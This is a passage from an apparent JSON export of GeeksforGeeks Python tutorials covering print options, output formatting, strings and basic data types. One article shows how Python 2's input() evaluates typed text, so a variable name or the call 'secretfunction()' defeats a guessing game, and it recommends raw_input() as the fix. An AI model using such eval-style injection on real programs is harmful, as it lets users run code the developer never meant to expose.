fine.References:\u00a01.More About Input in Python 2.7\u00a02.Output via sys library and other commands.\u00a03.Input via sys library and other commands.\u00a04. Python atexit Module docs.This article is contributed by Shubham Saxena. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "468f22ce7ab4458b19b6e60d367b9249",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "This article aims at explaining and exploring the vulnerability in the input() function in Python 2.x. In Python 3, the raw_input() function was erased, and it\u2019s functionality was transferred to a new built-in function known as input().Ways to input data in Python 2.xThere are two common methods to receive input in Python 2.x:Using the input() function: This function takes the value and type of the input you enter as it is without modifying any type.Using the raw_input() function : This function explicitly converts the input you give to type string,Let us use the following program to determine the difference between the two:# Python 2.x program to show differences between# input() and rawinput()function\u00a0\u00a0\u00a0# 3 inputs using raw_input() function,\u00a0# after which data type of the value# entered is displayeds1 = raw_input(\"Enter input to test raw_input() function: \")print type(s1)\u00a0\u00a0s2 = raw_input(\"Enter input to test raw_input() function: \")print type(s2)\u00a0\u00a0s3 = raw_input(\"Enter input to test raw_input() function: \")print type(s3)\u00a0\u00a0# 3 inputs using input() function,\u00a0# after which data type of the value# entered is displayeds4 = input(\"Enter input to test input() function: \")print type(s4)\u00a0\u00a0s5 = input(\"Enter input to test input() function: \")print type(s5)\u00a0\u00a0s6 = input(\"Enter input to test input() function: \")print type(s6)Input:\r\nHello\r\n456\r\n[1,2,3]\r\n45\r\n\"goodbye\"\r\n[1,2,3]\r\nOutput:\r\nEnter input to test raw_input() function: <type 'str'>\r\nEnter input to test raw_input() function: <type 'str'>\r\nEnter input to test raw_input() function: <type 'str'>\r\n\r\nEnter input to test input() function: <type 'int'>\r\nEnter input totest input() function: <type 'str'>\r\nEnter input to test input() function: <type 'list'>\r\nNote: While giving string input in the input() function, we have to enclose to value in double quotes. This is not required in raw_input()Vulnerability in input() methodThe vulnerability in input() method lies in the fact that the variable accessing the value of input can be accessed by anyone just by using the name of variable or method. Let\u2019s explore these one by one:Variable name as input parameter: The variable having the value of input variable is able to access the value of the input variable directly.# Python 2.x program to show Vulnerabilities# in input() function using a variable\u00a0\u00a0\u00a0import randomsecret_number = random.randint(1,500)print \"Pick a number between 1 to 500\"while True:\u00a0\u00a0\u00a0\u00a0res = input(\"Guess the number: \")\u00a0\u00a0\u00a0\u00a0if res==secret_number:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print \"You win\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print \"You lose\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0continueInput:15\r\nOutput:\r\nPick a number between 1 to 500\r\nGuess the number: You lose\r\nGuess the number: \r\nInput:secret_number\r\nOutput:\r\nPick a number between 1 to 500\r\nGuess the number: You win\r\nAs it can be seen, in second case the variable \u201csecret_number\u201d can be directly given as input and answer is always \u201cYou won\u201d. It evaluates the variable as if a number was directly entered, by which means it returns a True Boolean always. Using raw_input, it would not be possible as it disallows to read the variable directly.Function name as parameter: The vulnerability lies here as we can even provide the name of a function as input and access values that are otherwise not meant to be accessed.# Python 2.x program to demonstrate input() function# vulnerability by passing function name as parametersecret_value = 500\u00a0\u00a0# function that returns the secret valuedef secretfunction():\u00a0\u00a0\u00a0\u00a0return secret_value\u00a0\u00a0# using raw_input() to enter the numberinput1 = raw_input(\"Raw_input(): Guess secret number: \")\u00a0\u00a0# input1 will be explicitly converted to a stringif input1 == secret_value:\u00a0\u00a0\u00a0\u00a0print \"You guessed correct\"else:\u00a0\u00a0\u00a0\u00a0print \"wrong answer\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# using input() to enter the numberinput2 = input(\"Input(): Guess the secret number: \")\u00a0\u00a0#input2 is evaluated as it is enteredif input2 == secret_value:\u00a0\u00a0\u00a0\u00a0print \"You guessed correct\"else:\u00a0\u00a0\u00a0\u00a0print \"wrong answer\"Input:\r\n400\r\nsecretfunction()\r\nOutput:\r\nRaw_input(): Guess secret number: wrong answer\r\nInput(): Guess the secret number: You guessed correct\r\nIn this set of input/output, we can see that when we use raw_input, we necessarily have to input the correct number. However while using the input() function, we can even provide the name of a function or variable, and the interpreter will evaluate that.Here for example, the input for input() function has been given as the name of a function \u2018secretfunction()\u2019. The interpreter evaluates this function call and returns the secret number that we wish to find and hence our if condition evaluates to be true, even though we did not enter the secret numberInput:\r\nsecretfunction()\r\nsecret_value\r\nOutput:\r\nRaw_input(): Guess secret number: wrong answer\r\nInput(): Guess the secret number: You guessed correct\r\nAs explained in first point, in this example also we were able to simply enter the variable name \u2018secret_number\u2019 in the input for \u2018input()\u2019 function and we were able to gain access to the secret value.However while trying to call secretfunction() in the input for the raw_input() function, it gives us false as the interpreter converts our argument to string, and doesn\u2019t evaluate it as a function call.Preventing input vulnerabilitiesIt is always better to use raw_input() in python 2.x and then explicitly convert the input to whatever type we require. For example, if we wish to take input of an integer, we can do the following\r\nn = int(raw_input())\r\nThis prevents the malicious calling or evaluation of functions.This article is contributed by Deepak Srivatsav. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "903a00ceaf6164acc499e9c382f7e554",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python print() function prints the message to the screen or any other standard output device.Syntax: print(value(s), sep= \u2018 \u2018, end = \u2018\\n\u2019, file=file, flush=flush)Parameters:\u00a0value(s) : Any value, and as many as you like. Will be converted to string before printedsep=\u2019separator\u2019 : (Optional) Specify how to separate the objects, if there is more than one.Default :\u2019 \u2018end=\u2019end\u2019: (Optional) Specify what to print at the end.Default : \u2018\\n\u2019file : (Optional) An object with a write method. Default :sys.stdoutflush : (Optional) A Boolean, specifying if the output is flushed (True) or buffered (False). Default: FalseReturns: It returns output to the screen.Though it is not necessary to pass arguments in the print() function, it requires an empty parenthesis at the end that tells python to execute the function rather calling it by name. Now, let\u2019s explore the optional arguments that can be used with the print() function.String LiteralsString literals in python\u2019s print statement are primarily used to format or design how a specific string appears when printed using the print() function.\\n : This string literal is used to add a new blank line while printing a statement.\u201c\u201d : An empty quote (\u201c\u201d) is used to print an empty line.Example:Python3print(\"GeeksforGeeks \\n is best for DSA Content.\")Output:GeeksforGeeks \n is best for DSA Content.end= \u201d \u201d statementThe end keyword is used to specify the content that is to be printed at the end of the execution of the print() function. By default, it is set to \u201c\\n\u201d, which leads to the change of line after the execution of print() statement.Example: Python print() without new line.Python3# This line will automatically add a new line before the# next print statementprint (\"GeeksForGeeks is the best platform for DSA content\")\u00a0# This print() function ends with \"**\" as set in the end argument.print (\"GeeksForGeeks is the best platform for DSA content\", end= \"**\")print(\"Welcome to GFG\")Output:GeeksForGeeks is the best platform for DSA content\nGeeksForGeeks is the best platform for DSA content**Welcome to GFGflush ArgumentThe I/Os in python are generally buffered, meaning they are used in chunks. This is where flush comes in as it helps users to decide if they need the written content to be buffered or not. By default, it is set to false. If it is set to true, the output will be written as a sequence of characters one after the other. This process is slow simply because it is easier to write in chunks rather than writing one character at a time. To understand the use case of the flush argument in the print() function, let\u2019s take an example.Example:Imagine you are building a countdown timer, which appends the remaining time to the same line every second. It would look something like below:3>>>2>>>1>>>StartThe initial code for this would look something like below;Python3import time\u00a0count_seconds = 3for i in reversed(range(count_seconds + 1)):\u00a0\u00a0\u00a0\u00a0if i > 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(i, end='>>>')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0time.sleep(1)\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Start')So, the above code adds text without a trailing newline and then sleeps for one second after each text addition. At the end of the countdown, it prints Start and terminates the line. If you run the code as it is, it waits for 3 seconds and abruptly prints the entire text at once. This is a waste of 3 seconds caused due to buffering of the text chunk as shown below:Though buffering serves a purpose, it can result in undesired effects as shown above. To counter the same issue, the flush argument is used with the print() function. Now, set the flush argument as true and again see the results.Python3import time\u00a0count_seconds = 3for i in reversed(range(count_seconds + 1)):\u00a0\u00a0\u00a0\u00a0if i > 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(i, end='>>>', flush = True)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0time.sleep(1)\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Start')Output:https://media.geeksforgeeks.org/wp-content/uploads/20201222163647/Untitled26---Jupyter-Notebook---Google-Chrome-2020-12-22-16-33-02.mp4SeparatorThe print() function can accept any number of positional arguments. These arguments can be separated from each other using a \u201c,\u201d separator. These are primarily used for formatting multiple statements in a single print() function.Example:Python3b = \"for\"\u00a0print(\"Geeks\", b , \"Geeks\")Output:Geeks for Geeksfile ArgumentContrary to popular belief, the print() function doesn\u2019t convert the messages into text on the screen. These are done by lower-level layers of code, that can read data(message) in bytes. The print() function is an interface over these layers, that delegates the actual printing to a stream or file-like object. By default, the print() function is bound to sys.stdout through the file argument.\u00a0Example: Python print() to filePython3import io\u00a0# declare a dummy filedummy_file = io.StringIO()\u00a0# add message to the dummy fileprint('Hello Geeks!!', file=dummy_file)\u00a0# get the value from dummy filedummy_file.getvalue()Output:'Hello Geeks!!\\n'Example : Using print() function in PythonPython3# Python 3.x program showing# how to print data on# a screen\u00a0# One object is passedprint(\"GeeksForGeeks\")\u00a0x = 5# Two objects are passedprint(\"x =\", x)\u00a0# code for disabling the softspace featureprint('G', 'F', 'G', sep='')\u00a0# using end argumentprint(\"Python\", end='@')print(\"GeeksforGeeks\")Output:GeeksForGeeks\nx = 5\nGFG\nPython@GeeksforGeeksMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "0dfd09f844816f81781b691b1ee00b5e",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Generally, people switching from C/C++ to Python wonder how to print two or more variables or statements without going into a new line in python. Since the python print() function by default ends with a newline. Python has a predefined format if you use print(a_variable) then it will go to the next line automatically.\u00a0\u00a0For example:\u00a0Python3print(\"geeks\")print(\"geeksforgeeks\")Will result in this:\u00a0geeks\ngeeksforgeeksBut sometimes it may happen that we don\u2019t want to go to the next line but want to print on the same line. So what we can do?\u00a0\u00a0For Example:\u00a0Input : print(\"geeks\") print(\"geeksforgeeks\")\nOutput : geeks geeksforgeeks\n\nInput : a = [1, 2, 3, 4]\nOutput : 1 2 3 4 The solution discussed here is totally dependent on the python version you are using.\u00a0\u00a0Print without newline in Python 2.xpython# Python 2 code for printing# on the same line printing# geeks and geeksforgeeks# in the same line\u00a0print(\"geeks\"),print(\"geeksforgeeks\")\u00a0# arraya = [1, 2, 3, 4]\u00a0# printing a element in same# linefor i in range(4):\u00a0\u00a0\u00a0\u00a0print(a[i]),Output:\u00a0geeks geeksforgeeks\n1 2 3 4Print without newline in Python 3.xpython3# Python 3 code for printing# on the same line printing# geeks and geeksforgeeks# in the same line\u00a0print(\"geeks\", end =\" \")print(\"geeksforgeeks\")\u00a0# arraya = [1, 2, 3, 4]\u00a0# printing a element in same# linefor i in range(4):\u00a0\u00a0\u00a0\u00a0print(a[i], end =\" \")Output:\u00a0geeks geeksforgeeks\n1 2 3 4Print without newline in Python 3.x without using for loopPython3# Print without newline in Python 3.x without using for loop\u00a0l=[1,2,3,4,5,6]\u00a0# using * symbol prints the list# elements in a single lineprint(*l)\u00a0#This code is contributed by anuragsingh1022Output:1 2 3 4 5 6My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "3c718dfe9f7140f67953fd4af9b9019a",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "By default python\u2019s print() function ends with a newline. A programmer with C/C++ background may wonder how to print without newline.Python\u2019s print() function comes with a parameter called \u2018end\u2019. By default, the value of this parameter is \u2018\\n\u2019, i.e. the new line character. You can end a print statement with any character/string using this parameter.# This Python program must be run with# Python 3 as it won't work with 2.7.\u00a0\u00a0# ends the output with a <space>\u00a0print(\"Welcome to\" , end = ' ')\u00a0print(\"GeeksforGeeks\", end = ' ')Output :\r\nWelcome to GeeksforGeeksOne more program to demonstrate working of end parameter.# This Python program must be run with# Python 3 as it won't work with 2.7.\u00a0\u00a0# ends the output with '@'print(\"Python\" , end = '@')\u00a0print(\"GeeksforGeeks\")Output :\r\nPython@GeeksforGeeksThis article is contributed by Ankit Bindal. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed aboveMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "6358e8c6386f9e7796c8e05b79b03c13",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The separator between the arguments to print() function in Python is space by default (softspace feature) , which can be modified and can be made to any character, integer or string as per our choice. The \u2018sep\u2019 parameter is used to achieve the same, it is found only in python 3.x or later. It is also used for formatting the output strings.\u00a0Examples:Python3#code for disabling the softspace featureprint('G','F','G', sep='')\u00a0#for formatting a dateprint('09','12','2016', sep='-')\u00a0#another exampleprint('pratik','geeksforgeeks', sep='@')Output:\u00a0\u00a0GFG\n09-12-2016\npratik@geeksforgeeksThe sep parameter when used with the end parameter it produces awesome results. Some examples by combining the sep and end parameters.\u00a0Python3print('G','F', sep='', end='')print('G')#\\n provides new line after printing the yearprint('09','12','2016', sep='-', end='\\n')\u00a0print('prtk','agarwal', sep='', end='@')print('geeksforgeeks')Output:\u00a0\u00a0GFG\n09-12-2016\nprtkagarwal@geeksforgeeksNote: Please change the language from Python to Python 3 in the online ide.\u00a0Go to your interactive python ide by typing python in your cmd ( windows ) or terminal ( linux )\u00a0Python3#import the below module and see what happensimport antigravity#NOTE - it wont work on online ideThis article is contributed by Pratik Agarwal. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "1bac4c07fc682b752d0b42bdec620457",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "There are several ways to present the output of a program. Data can be printed in a human-readable form, or written to a file for future use, or even in some other specified form. Users often want more control over the formatting of output than simply printing space-separated values. There are several ways to format output.\u00a0To use formatted string literals, begin a string with f or F before the opening quotation mark or triple quotation mark.The str. format() method of strings helps a user create a fancier outputUsers can do all the string handling by using string slicing and concatenation operations to create any layout that the users want. The string type has some methods that perform useful operations for padding strings to a given column width.Formatting output using String modulo operator(%) :\u00a0The % operator can also be used for string formatting. It interprets the left argument much like a printf()-style format as in C language strings to be applied to the right argument. In Python, there is no printf() function but the functionality of the ancient printf is contained in Python. To this purpose, the modulo operator % is overloaded by the string class to perform string formatting. Therefore, it is often called a string modulo (or sometimes even called modulus) operator.\u00a0The string modulo operator ( % ) is still available in Python(3.x) and is widely used. But nowadays the old style of formatting is removed from the language.\u00a0Python3# Python program showing how to use# string modulo operator(%) to print# fancier output\u00a0# print integer and float valueprint(\"Geeks : %2d, Portal : %5.2f\" % (1, 05.333))\u00a0# print integer valueprint(\"Total students : %3d, Boys : %2d\" % (240, 120))\u00a0# print octal valueprint(\"%7.3o\" % (25))\u00a0# print exponential valueprint(\"%10.3E\" % (356.08977))Output :\u00a0Geeks :  1, Portal : 5.33\nTotal students : 240, Boys : 120\n    031\n3.561E+02There are two of those in our example: \u201c%2d\u201d and \u201c%5.2f\u201d. The general syntax for a format placeholder is:\u00a0 %[flags][width][.precision]type Let\u2019s take a look at the placeholders in our example.\u00a0\u00a0The first placeholder \u201c%2d\u201d is used for the first component of our tuple, i.e. the integer 1. The number will be printed with 2 characters. As 1 consists only of one digit, the output is padded with 1 leading blanks.The second one \u201c%5.2f\u201d is a format description for a float number. Like other placeholders, it is introduced with the % character. This is followed by the total number of digits the string should contain. This number includes the decimal point and all the digits, i.e. before and after the decimal point.Our float number 05.333 has to be formatted with 5 characters. The decimal part of the number or the precision is set to 2, i.e. the number following the \u201c.\u201d in our placeholder. Finally, the last character \u201cf\u201d of our placeholder stands for \u201cfloat\u201d.Formatting output using the format method :\u00a0The format() method was added in Python(2.6). The format method of strings requires more manual effort. Users use {} to mark where a variable will be substituted and can provide detailed formatting directives, but the user also needs to provide the information to be formatted. This method lets us concatenate elements within an output through positional formatting. For Example \u2013\u00a0Code 1:\u00a0\u00a0Python3# Python program showing# use of format() method\u00a0# using format() methodprint('I love {} for \"{}!\"'.format('Geeks', 'Geeks'))\u00a0# using format() method and referring# a position of the objectprint('{0} and {1}'.format('Geeks', 'Portal'))\u00a0print('{1} and {0}'.format('Geeks', 'Portal'))\u00a0\u00a0# the above formatting can also be done by using f-Strings# Although, this features work only with python 3.6 or above.\u00a0print(f\"I love {'Geeks'} for \\\"{'Geeks'}!\\\"\")\u00a0# using format() method and referring# a position of the objectprint(f\"{'Geeks'} and {'Portal'}\")Output :\u00a0I love Geeks for \"Geeks!\"\nGeeks and Portal\nPortal and GeeksThe brackets and characters within them (called format fields) are replaced with the objects passed into the format() method. A number in the brackets can be used to refer to the position of the object passed into the format() method.\u00a0\u00a0\u00a0Code 2:\u00a0Python3# Python program showing# a use of format() method\u00a0# combining positional and keyword argumentsprint('Number one portal is {0}, {1}, and {other}.'\u00a0\u00a0\u00a0\u00a0\u00a0.format('Geeks', 'For', other ='Geeks'))\u00a0# using format() method with numberprint(\"Geeks :{0:2d}, Portal :{1:8.2f}\".\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0format(12, 00.546))\u00a0# Changing positional argumentprint(\"Second argument: {1:3d}, first one: {0:7.2f}\".\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0format(47.42, 11))\u00a0print(\"Geeks: {a:5d},\u00a0 Portal: {p:8.2f}\".\u00a0\u00a0\u00a0\u00a0\u00a0format(a = 453, p = 59.058))Output:\u00a0Number one portal is Geeks, For, and Geeks.\nGeeks :12, Portal :    0.55\nSecond argument:  11, first one:   47.42\nGeeks:   453, Portal:    59.06The following diagram with an example usage depicts how the format method works for positional parameters:\u00a0\u00a0\u00a0Code 3:\u00a0Python3# Python program to# show format () is# used in dictionary\u00a0tab = {'geeks': 4127, 'for': 4098, 'geek': 8637678}\u00a0# using format() in dictionaryprint('Geeks: {0[geeks]:d}; For: {0[for]:d}; '\u00a0\u00a0\u00a0\u00a0'Geeks: {0[geek]:d}'.format(tab))\u00a0data = dict(fun =\"GeeksForGeeks\", adj =\"Portal\")\u00a0# using format() in dictionaryprint(\"I love {fun} computer {adj}\".format(**data))Output:\u00a0Geeks: 4127; For: 4098; Geeks: 8637678\nI love GeeksForGeeks computer PortalFormatting output using the String method :\u00a0This output is formatted by using string slicing and concatenation operations. The string type has some methods that help in formatting output in a fancier way. Some methods which help in formatting an output are str.rjust(), str.rjust(), and str.centre()Python3# Python program to# format a output using# string() method\u00a0cstr = \"I love geeksforgeeks\"\u00a0\u00a0\u00a0# Printing the center aligned\u00a0# string with fillchrprint (\"Center aligned string with fillchr: \")print (cstr.center(40, '#'))\u00a0# Printing the left aligned\u00a0# string with \"-\" padding\u00a0print (\"The left aligned string is : \")print (cstr.ljust(40, '-'))\u00a0# Printing the right aligned string# with \"-\" padding\u00a0print (\"The right aligned string is : \")print (cstr.rjust(40, '-'))Output:\u00a0Center aligned string with fillchr: \n##########I love geeksforgeeks##########\n\nThe left aligned string is : \nI love geeksforgeeks--------------------\n\nThe right aligned string is : \n--------------------I love geeksforgeeks\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "8fbb2c1245117f6727e2ae64f4720343",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In the previous article, we read about the basics of Python. Now, we continue with some more python concepts.Strings in Python\u00a0A string is a sequence of characters. It can be declared in python by using double-quotes. Strings are immutable, i.e., they cannot be changed.Python# Assigning string to a variablea = \"This is a string\"print (a)Lists in Python\u00a0Lists are one of the most powerful tools in python. They are just like the arrays declared in other languages. But the most powerful thing is that list need not be always homogeneous. A single list can contain strings, integers, as well as objects. Lists can also be used for implementing stacks and queues. Lists are mutable, i.e., they can be altered once declared.Python# Declaring a listL = [1, \"a\" , \"string\" , 1+2]print LL.append(6)print LL.pop()print Lprint L[1]The output is :\u00a0\u00a0[1, 'a', 'string', 3]\n[1, 'a', 'string', 3, 6]\n[1, 'a', 'string', 3]\naTuples in Python\u00a0A tuple is a sequence of immutable Python objects. Tuples are just like lists with the exception that tuples cannot be changed once declared. Tuples are usually faster than lists.Pythontup = (1, \"a\", \"string\", 1+2)print(tup)print(tup[1])The output is :\u00a0(1, 'a', 'string', 3)\naIterations in Python\u00a0Iterations or looping can be performed in python by \u2018for\u2019 and \u2018while\u2019 loops. Apart from iterating upon a particular condition, we can also iterate on strings, lists, and tuples.Example 1: Iteration by while loop for a conditionPythoni = 1while (i < 10):\u00a0\u00a0\u00a0\u00a0print(i)\u00a0\u00a0\u00a0\u00a0i += 1The output is :\u00a01\n2\n3\n4\n5\n6\n7\n8\n9 Example 2: Iteration by for loop on stringPythons = \"Hello World\"for i in s :\u00a0\u00a0\u00a0\u00a0print (i)The output is :\u00a0H\ne\nl\nl\no\n \nW\no\nr\nl\ndExample 3: Iteration by for loop on listPythonL = [1, 4, 5, 7, 8, 9]for\u00a0 i in L:\u00a0\u00a0\u00a0\u00a0print (i)The output is :\u00a01\n4\n5\n7\n8\n9Example 4 : Iteration by for loop for rangePythonfor i in range(0, 10):\u00a0\u00a0\u00a0\u00a0print (i)The output is :\u00a00\n1\n2\n3\n4\n5\n6\n7\n8\n9 https://www.youtube.com/watch?v=pCoB45\u00a0Next Article \u2013 Python: Dictionary and KeywordsQuiz\u00a0on Data Types in Python\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "7ef6de672494a8c63de1537235f8be6e",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In Python, Strings are arrays of bytes representing Unicode characters. However, Python does not have a character data type, a single character is simply a string with a length of 1. Square brackets can be used to access elements of the string.Creating a StringStrings in Python can be created using single quotes or double quotes or even triple quotes.\u00a0Python3# Python Program for# Creation of String\u00a0# Creating a String# with single QuotesString1 = 'Welcome to the Geeks World'print(\"String with the use of Single Quotes: \")print(String1)\u00a0# Creating a String# with double QuotesString1 = \"I'm a Geek\"print(\"\\nString with the use of Double Quotes: \")print(String1)\u00a0# Creating a String# with triple QuotesString1 = '''I'm a Geek and I live in a world of \"Geeks\"'''print(\"\\nString with the use of Triple Quotes: \")print(String1)\u00a0# Creating String with triple# Quotes allows multiple linesString1 = '''Geeks\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0For\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Life'''print(\"\\nCreating a multiline String: \")print(String1)Output:\u00a0String with the use of Single Quotes: \nWelcome to the Geeks World\n\nString with the use of Double Quotes: \nI'm a Geek\n\nString with the use of Triple Quotes: \nI'm a Geek and I live in a world of \"Geeks\"\n\nCreating a multiline String: \nGeeks\n            For\n            LifeAccessing characters in PythonIn Python, individual characters of a String can be accessed by using the method of Indexing. Indexing allows negative address references to access characters from the back of the String, e.g. -1 refers to the last character, -2 refers to the second last character, and so on.\u00a0While accessing an index out of the range will cause an IndexError. Only Integers are allowed to be passed as an index, float or other types that will cause a TypeError.\u00a0Python3# Python Program to Access# characters of String\u00a0String1 = \"GeeksForGeeks\"print(\"Initial String: \")print(String1)\u00a0# Printing First characterprint(\"\\nFirst character of String is: \")print(String1[0])\u00a0# Printing Last characterprint(\"\\nLast character of String is: \")print(String1[-1])Output:\u00a0Initial String: \nGeeksForGeeks\n\nFirst character of String is: \nG\n\nLast character of String is: \nsString SlicingTo access a range of characters in the String, the method of slicing is used. Slicing in a String is done by using a Slicing operator (colon).\u00a0Python3# Python Program to# demonstrate String slicing\u00a0# Creating a StringString1 = \"GeeksForGeeks\"print(\"Initial String: \")print(String1)\u00a0# Printing 3rd to 12th characterprint(\"\\nSlicing characters from 3-12: \")print(String1[3:12])\u00a0# Printing characters between# 3rd and 2nd last characterprint(\"\\nSlicing characters between \" +\u00a0\u00a0\u00a0\u00a0\"3rd and 2nd last character: \")print(String1[3:-2])Output:\u00a0Initial String: \nGeeksForGeeks\n\nSlicing characters from 3-12: \nksForGeek\n\nSlicing characters between 3rd and 2nd last character: \nksForGeeDeleting/Updating from a StringIn Python, Updation or deletion of characters from a String is not allowed. This will cause an error because item assignment or item deletion from a String is not supported. Although deletion of the entire String is possible with the use of a built-in del keyword. This is because Strings are immutable, hence elements of a String cannot be changed once it has been assigned. Only new strings can be reassigned to the same name.\u00a0Updation of a character:\u00a0Python3# Python Program to Update# character of a String\u00a0String1 = \"Hello, I'm a Geek\"print(\"Initial String: \")print(String1)\u00a0# Updating a character# of the StringString1[2] = 'p'print(\"\\nUpdating character at 2nd Index: \")print(String1)Error:\u00a0Traceback (most recent call last):\u00a0File \u201c/home/360bb1830c83a918fc78aa8979195653.py\u201d, line 10, in\u00a0String1[2] = \u2018p\u2019\u00a0TypeError: \u2018str\u2019 object does not support item assignmentUpdating Entire String:Python3# Python Program to Update# entire String\u00a0String1 = \"Hello, I'm a Geek\"print(\"Initial String: \")print(String1)\u00a0# Updating a StringString1 = \"Welcome to the Geek World\"print(\"\\nUpdated String: \")print(String1)Output:\u00a0Initial String: \nHello, I'm a Geek\n\nUpdated String: \nWelcome to the Geek World Deletion of a character:\u00a0Python3# Python Program to Delete# characters from a String\u00a0String1 = \"Hello, I'm a Geek\"print(\"Initial String: \")print(String1)\u00a0# Deleting a character# of the Stringdel String1[2]print(\"\\nDeleting character at 2nd Index: \")print(String1)Error:\u00a0Traceback (most recent call last):\u00a0File \u201c/home/499e96a61e19944e7e45b7a6e1276742.py\u201d, line 10, in\u00a0del String1[2]\u00a0TypeError: \u2018str\u2019 object doesn\u2019t support item deletionDeleting Entire String:Deletion of the entire string is possible with the use of del keyword. Further, if we try to print the string, this will produce an error because String is deleted and is unavailable to be printed.\u00a0\u00a0Python3# Python Program to Delete# entire String\u00a0String1 = \"Hello, I'm a Geek\"print(\"Initial String: \")print(String1)\u00a0# Deleting a String# with the use of deldel String1print(\"\\nDeleting entire String: \")print(String1)Error:\u00a0Traceback (most recent call last):\u00a0File \u201c/home/e4b8f2170f140da99d2fe57d9d8c6a94.py\u201d, line 12, in\u00a0print(String1)\u00a0NameError: name \u2018String1\u2019 is not defined\u00a0Escape Sequencing in PythonWhile printing Strings with single and double quotes in it causes SyntaxError because String already contains Single and Double Quotes and hence cannot be printed with the use of either of these. Hence, to print such a String either Triple Quotes are used or Escape sequences are used to print such Strings.\u00a0Escape sequences start with a backslash and can be interpreted differently. If single quotes are used to represent a string, then all the single quotes present in the string must be escaped and same is done for Double Quotes.\u00a0Python3# Python Program for# Escape Sequencing# of String\u00a0# Initial StringString1 = '''I'm a \"Geek\"'''print(\"Initial String with use of Triple Quotes: \")print(String1)\u00a0# Escaping Single QuoteString1 = 'I\\'m a \"Geek\"'print(\"\\nEscaping Single Quote: \")print(String1)\u00a0# Escaping Double QuotesString1 = \"I'm a 